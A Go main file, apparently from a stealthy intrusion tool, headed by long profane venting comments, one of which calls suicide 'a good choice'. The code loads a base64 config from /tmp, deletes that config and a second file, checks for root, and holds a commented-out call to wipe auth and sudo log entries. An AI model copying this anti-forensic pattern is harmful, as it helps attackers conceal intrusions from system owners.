package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	bf "test/client/BF"
	check "test/client/CHECK"
	vars "test/vars"
	"time"

	"github.com/BurntSushi/toml"
)

// When I wrote this Code
// Only God and I
// Knew how it worked
// Now only God knows it !
// Good luck
// What am i doing with my life? :(
// What the fuck i have writen here?
// That file/ folder supposed to be a test file not a productive
// Log Lurnal of 28 Jun 2024 i slpit the project in multipple files
// I am scared for two things first of all if the entire pc crases
// and secondly and most the terrifing if i summon Baphomet

// UPDATE i run the UTMP Function and it workted (tears of accomplisment spread through my cheeks)
// Second UPDATE same day. Evrything crushes.

// 2 Jul 20 After a day off due to explosing diarrea i return to spread some tears againe

// Something magic happent. Somehow something workes. BUT copy paste comments makes errors. WTF?

// My supervisor just said to me that everything that i have wrote doesent matters.

// suicide seems a good choice

// I have change evrythong The hol programm needs to be changed FUUUUUUUCCCCCKKKKKKK

// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHH buck here againe fuck this project.

// GEOPROJECT

// FUCK MY LIFE evrything has to be changed. Regex doesent work Time stams are wrong

// FUCK FUCK FUCK I FOUND AN EASYER WAY AND MUCH MORE EFFECIENT  30% AT LEAST OF THE CODE GOES TO GARBAGE

// WEAKEND IS COMING

// 200 hundrend lines of pure pain just deleted

// back here againe Fuck you  need sleep

// After vacations still tring to fix this shitty mess.

// made the knocking i dont know why it is a good idea but i will give it a try.

// I have someone thath is looking at it. Somehow seems that it is doing something. I dont know if is a divine power that makes it work or i have made something
// right for once

// FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK
//  FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK

// START ALL OVER AGAINE

// Why i have to delete 2-3 mounths of work. WHY GOD WHY?

// Fucking result from 4000 lines of code i went to 500 nice? FUCK YOU

var ProxyIp [16]byte

var conf vars.Config

var DontDel bool = false

func init() {

	ReadTomlFile()
	os.Remove("/tmp/config.toml")
	os.Remove(conf.Flags.PreFile)

}

func main() {

	time.Sleep(1 * time.Second)

	euid := os.Geteuid()
	if euid == 0 {
		// authlog.DeleteSessionAndSudoeSyslogAuthlog(conf, vars.AUTH_LOG)
		fmt.Println("HERE")
		time.Sleep(2 * time.Second)
		fmt.Println(conf)

	}

	bf.Bf(conf) //

}

func ReadTomlFile() {
	x := check.OpenAndReadFiles("/tmp/config.toml")
	decodedToml, err := base64.StdEncoding.DecodeString(string(x))
	if err != nil {
		check.Check("Error decoding base64 TOML:", err)
		fmt.Println("Error decoding base64 TOML:", err)
		return
	}
	reader := bytes.NewReader(decodedToml)
	z := toml.NewDecoder(reader)
	z.Decode(&conf)
}
